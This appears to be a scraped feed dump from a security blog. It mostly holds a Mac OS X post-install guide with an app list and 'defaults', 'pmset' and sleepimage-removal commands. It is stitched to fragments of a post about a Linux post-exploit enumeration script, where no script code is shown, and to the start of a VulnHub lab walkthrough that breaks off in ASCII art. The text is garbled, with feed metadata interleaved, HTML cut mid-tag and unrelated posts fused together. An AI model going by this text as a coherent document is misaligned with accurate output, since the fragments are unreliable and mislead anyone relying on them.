<li>Home Brew - It’s self contained, easy to null should you need to.</li> \n <li>VLC</li> \n <li>Wireshark</li> \n <li>uTorrent</li> \n <li>MS Office for Mac</li> \n <li>Google Drive</li> \n <li>Alfred 2</li> \n <li>The Unarchiver</li> \n <li>Xcode</li> \n <li>iTerm</li> \n <li>OSX Command Line Tools</li> \n <li>MacVim</li> \n <li>Reader 2 - RSS reader + feedly</li> \n <li>Quassel Client - IRC</li> \n <li>Skype</li> \n <li>Spotify</li> \n <li>Firefox</li> \n <li>Chrome</li> \n <li>Airmail 2</li> \n <li>VMWare Fusion</li> \n <li>KeePassX</li> \n <li>Caffeine</li> \n <li>Trim Enabler (only needed for after market SSD’s)</li> \n <li>iStat Menus 5</li> \n <li>Battery Logger</li> \n</ul> \n<h2 id=\"swap-spotlight-for-alfred---shortcut-key\">Swap spotlight for Alfred - shortcut key.</h2> \n<p>First go to <code>Settings &gt; Spotlight</code> and untick “Spotlight search keyboard shortcut: CMD + SPACE”</p> \n<p>Open Alfred and change it to <code>CMD+SPACE</code></p> \n<h2 id=\"disable-automatically-rearrange-spaces\">Disable “Automatically rearrange Spaces”</h2> \n<p>This drives me insane, <code>System Preferences &gt; Mission Control</code> untick <strong>Automatically rearrange Spaces based on recent use</strong></p> \n<h2 id=\"change-osx-screenshot-location\">Change OSX Screenshot Location</h2> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">defaults write com.apple.screencapture location ~/Pictures/Screenshots\n\nkillall SystemUIServer </code></pre>\n</figure> \n<p>When using an aftermarket SSD, I used <a href=\"https://www.cindori.org/software/trimenabler/\">Trim Enabler</a></p> \n<div class=\"note warning\"> \n <h5>Warning turns off text security setting for ktexts.</h5> \n <p>Ktext signing works by checking if all the drivers in the system are unaltered by a third party, or approved by Apple. If they have been modified, Yosemite will no longer load the driver.</p> \n</div> \n<p><img src=\"https://highon.coffee/img/blog/macbook-post-install-config-apps/trim-enabler-disable-ktexts.png\" alt=\"Max OS X Enable Trim\" /></p> \n<h2 id=\"disable-sudden-motion-sensor---sms\">Disable Sudden Motion Sensor - SMS</h2> \n<p>Again if you have an Apple SSD, skip this.</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>pmset <span class=\"nt\">-a</span> sms 0</code></pre>\n</figure> \n<p>confirm with:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">pmset <span class=\"nt\">-g</span> </code></pre>\n</figure> \n<h2 id=\"disable-sleep-image\">Disable sleep image</h2> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo rm</span> /private/var/vm/sleepimage\n<span class=\"nb\">sudo </span>pmset <span class=\"nt\">-a</span> hibernatemode 0 \npmset <span class=\"nt\">-g</span> | <span class=\"nb\">grep </span>hibernatemode </code></pre>\n</figure> \n<p>All I can think of for now…</p>","descriptionType":"text/html","publishedDate":"Mon, 06 Apr 2015 01:04:18 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-dock-on-left.png","linkMd5":"580cbf72546f80bb93799064140c5ced","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn61@2020_4/2020/08/25/01-24-54-332_1225b76f75c4cfa0.webp","destWidth":780,"destHeight":487,"sourceBytes":69157,"destBytes":52158,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-dock-on-left.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn61@2020_4/2020/08/25/01-24-54-332_1225b76f75c4cfa0.webp","https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-enable-right-click-trackpad.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn95@2020_1/2020/08/25/01-25-14-605_b8c66de35dbbc125.webp","https://highon.coffee/img/blog/macbook-post-install-config-apps/mac-osx-mount-cifs-share.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn28@2020_4/2020/08/25/01-25-14-615_07ced39cbd7434cf.webp","https://highon.coffee/img/blog/macbook-post-install-config-apps/os-x-finder-show-file-extensions.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn62@2020_5/2020/08/25/01-25-14-639_ead4866f83ce0fa1.webp","https://highon.coffee/img/blog/macbook-post-install-config-apps/trim-enabler-disable-ktexts.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn72@2020_6/2020/08/25/01-25-15-938_3aee546835f13379.webp"},"publishedOrCreatedDate":1598318675550},{"createdTime":"2020-08-25 <li><a href=\"https://highon.coffee/blog/linux-local-enumeration-script/#linux-local-enumeration-script-demo\" id=\"markdown-toc-linux-local-enumeration-script-demo\">Linux Local Enumeration Script Demo</a></li> \n <li><a href=\"https://highon.coffee/blog/linux-local-enumeration-script/#script-code\" id=\"markdown-toc-script-code\">Script Code</a></li> \n <li><a available below, it’s far from perfect and I could spend forever improving it.</p> \n<p>But, it has saved me a bunch of time and it works great for a first pass, after that post shell excitment :)</p> \n<p>You might also be interested in this list of <a href=\"https://highon.coffee/docs/linux-commands\">Linux commands</a> for post exploit / local privilege enumeration.</p> \n<h2 src=\"https://highon.coffee/img/blog/linux-local-enumeration-script/linux-local-enumeration-script.gif\" alt=\"Linux Local Enumeration Script Demo\" /></p> \n<h2 id=\"script-code\">Script Code</h2> fun VM.</p> \n<p><strong>Author:</strong> <a href=\"https://twitter.com/s4gi_\">@s4gi_ </a></p> \n<p><strong>Download:</strong> <a href=\"http://www.vulnhub.com/entry/devrandom-pipe,124/\">/dev/random: Pipe</a> via <a href=\"https://twitter.com/VulnHub\">@VulnHub</a></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">_______.__               \n<span class=\"se\">\\_</span>_____   <span class=\"se\">\\_</span>_|_____   ____  \n |     ___/  <span class=\"se\">\\_</span>___
